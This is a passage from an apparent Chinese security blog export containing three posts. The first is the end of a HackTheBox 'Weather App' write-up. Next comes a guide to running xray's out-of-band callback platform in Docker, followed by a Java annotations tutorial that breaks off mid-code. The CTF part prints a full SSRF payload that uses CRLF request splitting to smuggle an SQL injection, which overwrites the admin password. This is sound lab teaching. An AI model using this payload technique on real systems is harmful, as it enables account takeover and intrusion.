class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> <span class=\"keyword\">users</span> (username, <span class=\"keyword\">password</span>) <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"string\">&#x27;admin&#x27;</span>) <span class=\"keyword\">ON</span> CONFLICT(username) <span class=\"keyword\">DO</span> <span class=\"keyword\">UPDATE</span> <span class=\"keyword\">set</span> <span class=\"keyword\">password</span>=<span class=\"string\">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这样在注册的时候，username字段有冲突，就直接把该条记录更改为自己可控的字段。</p>\n<p>所以根据以上的内容，可以得到以下的payload</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/api/weather</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 178.62.14.223:30863</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: max-age=0</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class=\"line\"><span class=\"attribute\">If-None-Match</span>: W/&quot;40a-17749845bb8&quot;</span><br><span class=\"line\"><span class=\"attribute\">If-Modified-Since</span>: Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 474</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/query?param=1\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:80\\u010D\\u010A\\u010D\\u010A\\u010D\\u010APOST\\u0120/register\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1:80\\u010D\\u010AContent-Type:\\u0120application/x-www-form-urlencoded\\u010D\\u010AContent-Length:\\u012090\\u010D\\u010A\\u010D\\u010Ausername=admin&amp;password=321&#x27;)+on+CONFLICT(username)+do+update+set+password=%27123%27--+\\u010D\\u010A\\u010D\\u010AGET\\u0120/123&quot;,&quot;city&quot;:&quot;2&quot;,&quot;country&quot;: &quot;3&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>最后使用admin密码321进行登录，即可得到flag。</p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"https://xz.aliyun.com/t/2894\">通过拆分攻击实现的SSRF攻击</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/210036\">浅析HTTP走私攻击</a></li>\n<li>[题目源码，解压密码hackthebox](./Weather App.zip)</li>\n</ol>\n","categories":["Pentest"],"tags":["SSRF"]},{"title":"xray反连平台docker化","url":"http://blog.le31ei.top/2021/04/13/xray反连平台docker化/","content":"<p>每次在临时使用xray进行扫描时，都没有配置比较麻烦的反连平台，有些需要外联的漏洞都没有扫到。这次想整个docker持久化的放那里，随时可以用，使用docker维护方便，部署也非常方便。本文记录下配置过程中碰到的一些知识点。</p>\n<h1 id=\"0x01-xray配置项\"><a href=\"#0x01-xray配置项\" class=\"headerlink\" title=\"0x01 xray配置项\"></a>0x01 xray配置项</h1><p>配置反连平台主要的配置项在<code>reverse</code>项，主要有<code>http</code>、<code>dns</code>、<code>client</code>三个大项和其他一些小项目构成。</p>\n<p>先给出总的配置项，后面挨着对各个项目进行说明。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">reverse:</span></span><br><span class=\"line\">  <span class=\"attr\">db_file_path:</span> <span class=\"string\">&quot;./xray/db/reverse.db&quot;</span>                     </span><br><span class=\"line\">  <span class=\"attr\">token:</span> <span class=\"string\">&quot;password&quot;</span>                                </span><br><span class=\"line\">  <span class=\"attr\">http:</span></span><br><span class=\"line\">    <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">listen_ip:</span> <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span> </span><br><span class=\"line\">    <span class=\"attr\">listen_port:</span> <span class=\"string\">&quot;8080&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">ip_header:</span> <span class=\"string\">&quot;X-Forwarded-For&quot;</span>                       </span><br><span class=\"line\">  <span class=\"attr\">dns:</span></span><br><span class=\"line\">    <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">listen_ip:</span> <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span> </span><br><span class=\"line\">    <span class=\"attr\">domain:</span> <span class=\"string\">&quot;example.com&quot;</span>                          </span><br><span class=\"line\">    <span class=\"attr\">is_domain_name_server:</span> <span class=\"literal\">true</span>                 </span><br><span class=\"line\">    <span class=\"attr\">resolve:</span>                                     </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">A</span>                                    </span><br><span class=\"line\">      <span class=\"attr\">record:</span> <span class=\"string\">ns1</span></span><br><span class=\"line\">      <span class=\"attr\">value:</span> <span class=\"number\">154.</span><span class=\"string\">x.x.x</span></span><br><span class=\"line\">      <span class=\"attr\">ttl:</span> <span class=\"number\">60</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">A</span>                                    </span><br><span class=\"line\">      <span class=\"attr\">record:</span> <span class=\"string\">ns2</span></span><br><span class=\"line\">      <span class=\"attr\">value:</span> <span class=\"number\">154.</span><span class=\"string\">x.x.x</span></span><br><span class=\"line\">      <span class=\"attr\">ttl:</span> <span class=\"number\">60</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">remote_server:</span> <span class=\"literal\">false</span>                          </span><br><span class=\"line\">    <span class=\"attr\">http_base_url:</span> <span class=\"string\">&quot;http://recv.example.com&quot;</span>      </span><br><span class=\"line\">    <span class=\"attr\">dns_server_ip:</span> <span class=\"string\">&quot;154.x.x.x&quot;</span>               </span><br></pre></td></tr></table></figure>\n\n<p><strong>db_file_path</strong></p>\n<p>xray文档解释得很清楚了，反连平台的数据库，指明一个地址就行了。</p>\n<p><strong>token</strong></p>\n<p>反连平台的认证密码</p>\n<p><strong>http</strong></p>\n<p>这个选项就是监听的端口，需要说明的是因为是docker化使用frp代理的端口，因此需要通过http头的<code>X-Forwarded-For</code>字段读取远程的ip，否则是frp的docker容器的ip地址</p>\n<p><strong>dns</strong></p>\n<p>该选项配置DNS的相关信息，需要制定一个域名，用于反连平台的dns解析。后面的resolve选项，制定静态的dns解析，也就是反连平台作为服务器的解析规则。</p>\n<p><strong>client</strong></p>\n<p>该处是配置客户端的一些参数。**<code>remote_server</code>要设置为false，当设置为true的时候，会作为客户端在启动的时候请求外联平台。**另外两个参数则是在外联平台显示的地址。</p>\n<p><strong>dns设置</strong></p>\n<p>在域名设置的时候，一般来说需要两个域名。一个作为主域名，来进行dnslog请求，另一个作为NS记录的解析转发域名。也可以使用DNS的胶水记录（glue record）用一个域名来转发，但需要DNS服务商的支持。</p>\n<p>何为DNS胶水记录？</p>\n<p>首先要了解NS记录，ns记录用于指定域名用哪个DNS服务器来解析，一般只能设置为域名的形式，如NS1.example.com。而在只有一个域名的情况下，NS需要指定域名，而DNS服务器还没有对外广播的时候，那么就陷入一个死循环，ns记录需要设置为域名，但是本域名还没有被DNS服务器所解析。举个例子，如<code>a.com</code>设置的ns记录是<code>ns.a.com</code>，我们就必须制定<code>ns.a.com</code>的A记录，否则解析<code>ns.a.com</code>又会去解析<code>a.com</code>，所以该请求就要用到DNS胶水记录了。</p>\n<p>胶水记录本身为DNS所支持的功能。指定ns解析的域名时，可以使用本DNS的A记录。</p>\n<h1 id=\"0x02-docker化\"><a href=\"#0x02-docker化\" class=\"headerlink\" title=\"0x02 docker化\"></a>0x02 docker化</h1><p>项目采用docker compose的形式，直接可以使用<code>docker-compose -d</code>进行一键启动。基础镜像可以直接使用alpine，需要运行go程序，所以需要在<code>Dockerfile</code>中添加如下命令才能正常运行</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> mkdir /lib64 &amp;&amp; ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2</span></span><br></pre></td></tr></table></figure>\n\n<p>使用frp进行转发需要设置<code>depends_on</code></p>\n<p>具体的项目结构如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── Dockerfile</span><br><span class=\"line\">├── README.md</span><br><span class=\"line\">├── docker-compose.yml</span><br><span class=\"line\">└── tools</span><br><span class=\"line\">    ├── frp</span><br><span class=\"line\">    │   ├── frpc</span><br><span class=\"line\">    │   └── frpc.ini</span><br><span class=\"line\">    └── xray</span><br><span class=\"line\">        ├── config.yaml</span><br><span class=\"line\">        ├── db</span><br><span class=\"line\">        │   └── reverse.db</span><br><span class=\"line\">        └── xray</span><br><span class=\"line\"></span><br><span class=\"line\">4 directories, 8 files</span><br></pre></td></tr></table></figure>\n\n<p>Dockerfile:</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> alpine</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">LABEL</span><span class=\"bash\"> maintainer=<span class=\"string\">&quot;le31ei &lt;le31ei@qq.com&gt;&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> <span class=\"built_in\">echo</span> <span class=\"string\">&quot;https://mirrors.ustc.edu.cn/alpine/latest-stable/main&quot;</span> &gt; /etc/apk/repositories \\</span></span><br><span class=\"line\"><span class=\"bash\">    &amp;&amp; apk update \\</span></span><br><span class=\"line\"><span class=\"bash\">    &amp;&amp; apk add openssl musl-dev</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> mkdir /lib64 &amp;&amp; ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"bash\"> /tools</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Docker-compose.yml</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&quot;2&quot;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">xray:</span></span><br><span class=\"line\">    <span class=\"attr\">build:</span> <span class=\"string\">.</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./tools:/tools</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">./xray/xray</span> <span class=\"string\">--config</span> <span class=\"string\">./xray/config.yaml</span> <span class=\"string\">reverse</span> </span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">frp:</span></span><br><span class=\"line\">    <span class=\"attr\">build:</span> <span class=\"string\">.</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./tools:/tools</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">./frp/frpc</span> <span class=\"string\">-c</span> <span class=\"string\">./frp/frpc.ini</span></span><br><span class=\"line\">    <span class=\"attr\">depends_on:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">xray</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"遗留问题\"><a href=\"#遗留问题\" class=\"headerlink\" title=\"遗留问题\"></a>遗留问题</h1><p>反连平台的http模块支持从http协议的header中取真实ip，但dns模块没有类似的功能，所以在用docker封装的反连平台中，<code>RemoteAddr</code>均为docker中frp容器的地址，目前暂未想到解决办法，将就使用了。</p>\n<p><img src=\"/2021/04/13/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0docker%E5%8C%96/image-20210413141854001.png\" alt=\"image-20210413141854001\"></p>\n","categories":["Program"],"tags":["docker"]},{"title":"java安全学习之注解","url":"http://blog.le31ei.top/2021/03/30/java安全学习之注解/","content":"<h1 id=\"0x01-什么是注解\"><a href=\"#0x01-什么是注解\" class=\"headerlink\" title=\"0x01 什么是注解\"></a>0x01 什么是注解</h1><p>注解是在java中类、方法、参数前面的一种特殊的注释。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.itranswarp.learnjava;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.annotation.PostConstruct;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo1</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@PostConstruct</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Demo1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;after construct&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Demo1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;construct&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;this is demo1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Demo1 d = <span class=\"keyword\">new</span> Demo1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>注解共分为三类：</p>\n<ol>\n<li>编译器使用的注释，如<code>@Override</code>，检查该方法是否正确的实现了覆写</li>\n<li>由工具处理<code>.class</code>文件中使用的注解，一般在底层库使用</li>\n<li>程序运行中能够读取的注解，类似于自定义的注解，加载后存在于jvm中</li>\n</ol>\n<h1 id=\"0x02-定义注解\"><a href=\"#0x02-定义注解\" class=\"headerlink\" title=\"0x02 定义注解\"></a>0x02 定义注解</h1><p>在java中使用<code>@interface</code>语法来定义注解，例如<code>Override</code>的定义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Target(ElementType.METHOD)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> Override &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Override注解不带任何配置参数。<code>@Target</code>和<code>Retention</code>表示的是元注解，能够修饰自定义注解的注解</p>\n<h2 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h2><p><strong>@Target</strong></p>\n<p>表示定义的注解能够被用到哪些位置：</p>\n<ol>\n<li>类或者接口：<code>ElementType.TYPE</code></li>\n<li>字段：<code>ElementType.FIELD</code></li>\n<li>方法：<code>ElementType.METHOD</code></li>\n<li>构造方法：<code>ElementType.CONSTRUCTOR</code></li>\n<li>方法参数：<code>ElementType.PARAMETER</code></li>\n</ol>\n<p>可以定义一个注解同时用于方法或者字段上面，如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Target(&#123;ElementType.FIELD, ElementType.METHOD&#125;)</span>  <span class=\"comment\">// 使用数据表示</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> Demo2 &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>@Retention</strong></p>\n<p>定义了注解的生命周期:</p>\n<ol>\n<li>仅编译器：<code>RetentionPolicy.SOURCE</code></li>\n<li>仅class文件：<code>RetentionPolicy.CLASS</code></li>\n<li>运行期：<code>RetentionPolicy.RUNTIME</code></li>\n</ol>\n<p>如果<code>@Retention</code>不存在，则默认为<code>CLASS</code>，故在自定义注解时，需要写明<code>@Retention(RetentionPolicy.RUNTIME)</code>。</p>\n<p>还有一些其他属性，可查阅相关文档，不再赘述。</p>\n<p><strong>注解参数</strong></p>\n<p>在定义注解的时候可以定义一些参数，并且能够赋予默认的值，具体如下，原理类似于接口的定义，定义无方法体的方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Target(ElementType.TYPE)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> Report &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">type</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> 0</span>;</span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">level</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> &quot;info&quot;</span>;</span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">value</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> &quot;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-处理注解\"><a href=\"#0x03-处理注解\" class=\"headerlink\" title=\"0x03 处理注解\"></a>0x03 处理注解</h1><p>注解对java代码的运行逻辑没有任何影响，我们编写的<code>RUNTIME</code>类型的注解才会在代码运行时产生影响。</p>\n<p>所有的注解都继承于<code>java.lang.annotation.Annotation</code>，读取注解需要使用反射API。</p>\n<p>判断是否存在注解的API：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class.isAnnotationPresent(Class) <span class=\"comment\">//是否类定义了注解</span></span><br><span class=\"line\">Field.isAnnotationPresent(Class) <span class=\"comment\">// 是否字段定义了注解</span></span><br><span class=\"line\">Method.isAnnotationPresent(Class)   <span class=\"comment\">// 是否方法定义了注解</span></span><br><span class=\"line\">Constructor.isAnnotationPresent(Class)  <span class=\"comment\">// 是否构造方法定义了注解</span></span><br></pre></td></tr></table></figure>\n\n<p>例如，创建构造函数的注解</p>\n<p>注解：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.itranswarp.learnjava;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Target(ElementType.CONSTRUCTOR)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> Construct_Annotation &#123;</span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">descp</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> &quot;no description&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>注解使用：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo4</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Construct_Annotation</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Demo4</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;构造函数&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@MethodAnnotation</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hello</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello method&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Demo4 demo4 = <span class=\"keyword\">new</span> Demo4();</span><br><span class=\"line\">        Constructor[] constructors = demo4.getClass().getConstructors();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Constructor con: constructors)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (con.isAnnotationPresent(Construct_Annotation.class))&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;构造函数注解找到&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>注解的验证</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">check</span><span class=\"params\">(Person person)</span> <span class=\"keyword\">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class=\"line\">            Range range = field.getAnnotation(Range.class);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (range != <span 